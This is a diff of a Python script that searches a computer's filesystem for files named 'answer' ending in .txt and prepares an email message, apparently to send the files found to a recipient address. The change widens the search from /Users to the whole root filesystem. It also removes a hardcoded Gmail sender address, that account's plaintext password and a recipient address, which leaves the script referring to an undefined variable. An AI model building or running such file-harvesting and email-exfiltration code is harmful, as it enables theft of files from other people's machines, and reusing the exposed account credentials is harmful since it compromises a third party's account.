@@ -41,17 +41,12 @@ def findfile(name, extensions, path):
 #     as it is where most people store their files, and there is not point looking through system files
 
 
-# Main Program
-files = findfile("answer", [".txt"], "/Users")
+# --------------------- main program starts here ----------------------------
+
+files = findfile("answer", [".txt"], "/") #reference to instructions on findfile() if you want to change the file search
 
 print("Files found!\n")
 print("\n".join(files))
-
-# Email Variables - Needed to specificy contents of email
-
-fromaddr = "16636362dhwhba.cieuwya@gmail.com" # Enter the email you wish to send the data from. i put a random gmail address i created for demonstration purposes, remember that if you decide to use this one i can see all the emails you send and the location from where youve logged in from
-frompassword = "Manwoods61732" # Enter the password from the email here
-toaddr = "davidzatica@icloud.com" # Enter the email you wish to receive the data on
 
 msg = email()
 msg['From'] = fromaddr
